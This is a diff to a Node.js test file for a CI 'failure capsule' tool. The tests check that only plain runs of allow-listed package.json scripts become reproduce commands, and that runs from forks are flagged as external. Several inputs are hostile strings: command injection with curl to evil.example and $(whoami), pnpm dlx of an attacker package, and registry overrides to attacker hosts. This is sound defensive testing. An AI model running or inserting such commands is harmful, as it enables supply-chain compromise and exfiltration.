@@ -2,18 +2,24 @@
 import assert from "node:assert/strict";
 import test from "node:test";
 
-import { buildCapsule, commandOf, parseCapsuleArgs, renderCapsule, toolchainOf } from "./failure-capsule-core.mjs";
+import { buildCapsule, commandOf, isExternalRun, parseCapsuleArgs, renderCapsule, scriptsOf, toolchainOf } from "./failure-capsule-core.mjs";
 
 const SHA = "a".repeat(40);
 const RUN = {
   id: 77, conclusion: "failure", head_sha: SHA, head_branch: "feature/x", event: "pull_request", run_attempt: 2,
   html_url: "https://github.com/o/r/actions/runs/77",
+  repository: { full_name: "o/r" }, head_repository: { full_name: "o/r" },
 };
 const job = (name, conclusion, steps = []) => ({
   name, conclusion, html_url: "https://github.com/o/r/actions/runs/77/job/5", steps,
 });
 const step = (number, name, conclusion) => ({ number, name, conclusion });
-const PKG = JSON.stringify({ packageManager: "pnpm@10.33.0", engines: { node: ">=24" } });
+const PKG = JSON.stringify({
+  packageManager: "pnpm@10.33.0",
+  engines: { node: ">=24" },
+  scripts: { "test:unit": "x", "test:e2e": "x", lint: "x" },
+});
+const ALLOWED = scriptsOf(PKG);
 
 test("arguments are strict", () => {
   assert.deepEqual(parseCapsuleArgs(["--run", "123", "--json"]), { run: "123", json: true });
@@ -23,20 +29,58 @@ test("arguments are strict", () => {
   assert.throws(() => parseCapsuleArgs(["--run", "1", "--bogus"]));
 });
 
-test("only a plain pnpm call becomes a reproduce command", () => {
-  assert.equal(commandOf("Run pnpm test:unit"), "pnpm test:unit");
-  assert.equal(commandOf("Run pnpm test:e2e --project=desktop"), "pnpm test:e2e --project=desktop");
-  assert.equal(commandOf("Run pnpm test; curl evil.example"), null);
-  assert.equal(commandOf("Run $(whoami)"), null);
-  assert.equal(commandOf("Set up job"), null);
-  assert.equal(commandOf("Run pnpm  test"), null);
-  assert.equal(commandOf("Run pnpm test:unit && rm -rf x"), null);
+test("only a plain run of a script that exists on main becomes a reproduce command (F-122)", () => {
+  assert.equal(commandOf("Run pnpm test:unit", ALLOWED), "pnpm test:unit");
+  assert.equal(commandOf("Run pnpm run lint", ALLOWED), "pnpm lint");
+  // free arguments, package names, registries and anything that is not a main script: no command
+  for (const name of [
+    "Run pnpm dlx attacker-pkg",
+    "Run pnpm install --registry=http://attacker.example/",
+    "Run pnpm --config.registry=http://203.0.113.9:4873 install",
+    "Run pnpm add github:attacker/pkg",
+    "Run pnpm test:e2e --project=desktop",
+    "Run pnpm test:unit && echo x",
+    "Run pnpm test; curl evil.example",
+    "Run $(whoami)",
+    "Set up job",
+    "Run pnpm  lint",
+    "Run pnpm attacker-script",
+  ]) assert.equal(commandOf(name, ALLOWED), null, name);
+  // without main's script list nothing is allowed
+  assert.equal(commandOf("Run pnpm lint"), null);
+  assert.equal(commandOf("Run pnpm lint", scriptsOf("not json")), null);
 });
 
 test("a long run of dashes is refused at once instead of backtracking", () => {
   const started = Date.now();
-  assert.equal(commandOf(`Run pnpm - -${"-- -".repeat(5000)}x!`), null);
+  assert.equal(commandOf(`Run pnpm - -${"-- -".repeat(5000)}x!`, ALLOWED), null);
   assert.ok(Date.now() - started < 200);
+});
+
+test("a run from a fork or of unknown origin is external: no names, SHA or command", () => {
+  assert.equal(isExternalRun(RUN), false);
+  assert.equal(isExternalRun({ ...RUN, head_repository: { full_name: "fork/r" } }), true);
+  assert.equal(isExternalRun({ ...RUN, head_repository: { full_name: "O/R" } }), false);
+  assert.equal(isExternalRun({ ...RUN, head_repository: null }), true);
+  assert.equal(isExternalRun({ ...RUN, repository: undefined }), true);
+  const capsule = buildCapsule({
+    run: { ...RUN, head_repository: { full_name: "fork/r" } },
+    jobs: [job("Run pnpm dlx attacker-pkg", "failure", [step(1, "Run pnpm lint", "failure"), step(2, "Run pnpm dlx attacker-pkg", "failure")])],
+    artifacts: [{ name: "stolen", expired: false, size_in_bytes: 1 }],
+    packageJsonText: PKG,
+  });
+  assert.equal(capsule.external, true);
+  const out = renderCapsule(capsule).join("\n");
+  const json = JSON.stringify(capsule);
+  for (const text of [out, json]) {
+    assert.ok(!text.includes("attacker"));
+    assert.ok(!text.includes("-> reproduce"));
+    assert.ok(!text.includes(SHA));
+    assert.ok(!text.includes("stolen"));
+    assert.ok(!text.includes("pnpm lint"));
+  }
+  assert.match(out, /EXTERNAL RUN/);
+  assert.match(out, /Do not check out/);
 });
 
 test("toolchain pins come from package.json and tolerate a bad file", () => {
@@ -59,6 +103,7 @@ test("a capsule names the failed jobs and steps, and keeps a job called __proto_
   assert.deepEqual(capsule.failedJobs.map((j) => j.name), ["__proto__", "slow"]);
   assert.deepEqual(capsule.failedJobs[0].failedSteps, [{ number: 2, name: "Run pnpm test:unit", command: "pnpm test:unit" }]);
   assert.equal(capsule.headSha, SHA);
+  assert.equal(capsule.external, undefined);
   assert.equal(capsule.attempt, 2);
   assert.deepEqual(capsule.artifacts.map((a) => a.expired), [false, true]);
 });
